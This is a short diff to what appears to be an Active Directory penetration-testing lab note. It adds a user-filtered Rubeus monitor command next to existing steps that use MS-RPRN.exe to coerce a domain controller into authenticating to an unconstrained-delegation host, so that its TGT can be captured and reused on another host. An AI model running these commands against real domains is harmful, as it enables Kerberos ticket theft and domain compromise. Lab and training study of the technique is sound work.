@@ -291,6 +291,7 @@ Capture TGT of the dchost on the appserver host, then run MS-RPRN.exe ([https://
 {% code overflow="wrap" %}
 ```
 .\rubeus.exe monitor /interval:1 /nowrap  //do that on unconstrained macihine
+.\rubeus.exe monitor /targetuser:your-specific-user /interval:1 /nowrap   //if only specific User should be monitored, useful when a lot of activity
 MS-RPRN.exe \\dchost.dom.local \\appserver.dom.local    //do that on studentmachine
 
 Copy the base64 encoded TGT, remove extra spaces/crlf if any, and use it on another host
